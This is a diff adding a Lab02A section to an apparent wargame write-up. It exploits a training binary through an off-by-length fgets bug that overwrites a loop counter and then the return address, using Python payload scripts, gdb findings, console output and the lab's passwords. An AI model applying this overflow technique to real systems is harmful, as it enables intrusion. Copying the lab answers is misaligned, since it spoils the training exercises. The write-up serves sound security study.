@@ -203,6 +203,8 @@ We require the 4 padding X's before the parameters address as `ebp+8`
 
 And we get our password: `lab2A:i_c4ll_wh4t_i_w4nt_n00b`
 
+## Lab02A
+
 ```C
 void shell()
 {
@@ -255,3 +257,54 @@ int main(int argc, char** argv)
         return EXIT_SUCCESS;
 }
 ```
+
+Using gdb we can find `shell()` is at 0x080486fd.
+
+We find we can overwrite `i` since `fgets` has the wrong max length (`0x10` vs `10`). Using this, we can force the loop to iterate more than ten times, which will subsequently overflow `cat_buf`, eventually hitting the return address.
+
+Let's construct our payload, knowing we have a few required steps:
+1. Overflow `i` such that it's greater than 10
+2. Put a different character on each line
+
+We can do this with the following short script:
+
+```python
+print('X'*16) # Overflow into i
+
+for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
+    print(c)
+```
+
+Running `./lab2A` with gdb and piping this script in as input, we see that EIP is overwritten to `0x5a595857` -> `ZYXW`. Looks like the very end of our input hit the return address. Nice one!
+
+Now we can update our script to insert the address of `shell()` where `WXYZ` were:
+
+```python
+print('X'*16)
+
+for c in 'ABCDEFGHIJKLMNOPQRSTUV':
+    print(c)
+
+# Now insert the return address
+address = '\x08\x04\x86\xfd'[::-1] # Remember to use little endian
+
+for c in address:
+    print(c)
+print('')
+```
+
+This gives us a slightly frustrating result:
+
+```console
+lab2A@warzone:/levels/lab02$ cat /tmp/out.txt | ./lab2A
+Input 10 words:
+Failed to read word
+You got it
+Segmentation fault (core dumped)
+```
+
+We seem to be dropping into a shell and then exiting. This is happening because our STDIN is dying, so we can fix this by adding another `cat` command after sending our payload. Our final command becomes:
+
+`(cat /tmp/out.txt; cat) | ./lab2A`
+
+`lab2end:D1d_y0u_enj0y_y0ur_cats?`
